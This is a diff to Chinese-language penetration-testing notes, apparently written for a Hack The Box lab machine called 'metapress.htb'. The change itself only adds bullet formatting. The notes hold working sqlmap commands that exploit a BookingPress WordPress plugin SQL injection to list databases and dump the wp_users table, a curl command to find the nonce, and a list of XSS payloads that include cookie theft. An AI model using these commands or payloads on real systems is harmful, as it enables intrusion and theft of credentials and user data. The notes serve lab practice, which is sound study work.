@@ -26,18 +26,16 @@ DNS 子網域爆破 -> 尋找目標企業可能遺忘或未受保護的子網域
 ## 漏洞利用
 1. sqlmap
 - sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=[your nonce]&category_id=33&total_service=1" -p total_service --dbs --batch
-
 - sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=[your nonce]&category_id=33&total_service=1" -p total_service -D blog --tables --batch
 - sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=[your nonce]&category_id=33&total_service=1" -p total_service -D blog --T wp_users --dump --batch
-
-curl -s "http://metapress.htb" | grep -iE "nonce|bookingpress"
+- curl -s "http://metapress.htb" | grep -iE "nonce|bookingpress"
 
 2. XSS -> 使用 BurpSuite 攔截封包
-<script>alert(1)</script>
-<script>alert(document.cookie)</script>
-<svg/onload=alert(1)>
-<img src=# onerror=alert(1)>
-<a href="javascript:alert(1)">g</a>
+- <script>alert(1)</script>
+- <script>alert(document.cookie)</script>
+- <svg/onload=alert(1)>
+- <img src=# onerror=alert(1)>
+- <a href="javascript:alert(1)">g</a>
 <input type="text" value="g" onmouseover="alert(1)" />
 <iframe src="javascript:alert(1)"></iframe>
 
